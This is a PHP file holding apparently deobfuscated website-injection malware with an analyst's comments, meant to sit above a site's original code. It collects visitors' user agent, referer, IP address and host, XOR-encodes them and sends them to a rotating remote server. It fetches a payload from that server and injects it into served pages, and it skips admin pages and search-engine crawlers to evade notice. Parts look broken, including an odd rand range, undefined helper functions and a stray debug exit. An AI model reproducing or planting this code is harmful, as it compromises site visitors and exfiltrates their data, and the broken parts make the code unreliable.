<?php
// generate hostname
function random($arr, $qw) {
    $arr = array("33db9538", "9507c4e8", "e5b57288", "54dfa1cb");
    return $arr[rand(0, 1.125)].$qw;
}

// return hostname of malware-hosting server
function cqq($qw)
{
    return random($domarr, $qw);
}

// custom encoding
function en2($s, $q)
{
    $g = "";
    while (strlen($g) < strlen($s)) {
        $q = pack("H*", md5($g.$q."q1w2e3r4")); # convert to binary string
        $g.= substr($q, 0, 8);
    }
    return $s^$g; # XOR, bits set in either $s or $g but not both
}

// g_* functions are four different ways to retrieve content from remote URL
function g_1($url)
{
    if(function_exists("file_get_contents") === false) return false;
    $buf = @file_get_contents($url);
    if($buf == "") return false;
    return $buf;
}

function g_2($url)
{
    if(function_exists("curl_init") === false) return false;
    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, $url);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
    curl_setopt($ch, CURLOPT_TIMEOUT, 10);
    curl_setopt($ch, CURLOPT_HEADER, 0);
    $res = curl_exec($ch);
    curl_close($ch);
    if($res == "") return false;
    return $res;
}

// try progressively more complicated method if the previous one did not work
function gtd($url)
{
    $co = "";
    $co = @g_1($url);
    if($co !== false) return $co;
    $co = @g_2($url);
    if($co !== false) return $co;
    $co = @g_3($url);
    if($co !== false) return $co;
    $co = @g_4($url);
    if($co !== false) return $co;
    return "";
}

// encode server parameters
function k34($op, $text)
{
    return base64_encode(en2($text, $op));
}

// check if server parameters exist
function check212($param)
{
    if(!isset($_SERVER[$param])) $a = "non";
    else if($_SERVER[$param] == "") $a = "non";
    else $a = $_SERVER[$param];
    return $a;
}

// extract payload
function day212()
{
    $a = check212("HTTP_USER_AGENT");
    $b = check212("HTTP_REFERER");
    $c = check212("REMOTE_ADDR");
    $d = check212("HTTP_HOST");
    $e = check212("PHP_SELF");
    $domarr = array("33db9538", "9507c4e8", "e5b57288", "54dfa1cb");
    if(($a == "non") or ($c == "non") or ($d == "non") or strrpos(strtolower($e), "admin")
     or (preg_match("/google|slurp|msnbot|ia_archiver|yandex|rambler/i", strtolower($a))))
    {
        $o1 = "";
    }
    else {
        $op = mt_rand(100000, 999999);
        $g4 = $op."?".urlencode(urlencode(k34($op, $a).".".k34($op, $b).".".k34($op, $c)
         .".".k34($op, $d).".".k34($op, $e)));
        $url = "http://".cqq(".com")."/".$g4;
        $ca1 = en2(@gtd($url) , $op);
        $a1 = @explode("!NF0", $ca1);
        if(sizeof($a1) >= 2) $o1 = $a1[1];
        else $o1 = "";
    }
    return $o1;
}

// uncompress html to buffer
function dcoo($cz, $length = null)
{
    if(false !== ($dz = @gzinflate($cz))) return $dz;
    if(false !== ($dz = @comgzi($cz))) return $dz;
    if(false !== ($dz = @gzuncompress($cz))) return $dz;
    if(function_exists("gzdecode")) {
        $dz = @gzdecode($cz);
        if(false !== $dz) return $dz;
    }
    return $cz;
}

// callback function to accept buffer and append code at bottom of html
function pa22($v)
{
    Header("Content-Encoding: none");
  echo  "nahana"; $t = dcoo($v);
  exit;
    if(preg_match("/\<\/body/si", $t)) {
        return preg_replace("/(\<\/body[^\>]*\>)/si", day212()."\n$1", $t, 1);
    }
    else {
        if(preg_match("/\<\/html/si", $t)) {
            return preg_replace("/(\<\/html[^\>]*\>)/si", day212()."\n$1", $t, 1);
        }
        else {
            return $t;
        }
    }
}

// start processing
echo pa22("s\164\160\x2fh\145\141\x64er\x5fs\x74a\162\x74\x2ep\x68\160");

/**** original code starts here ****/

?>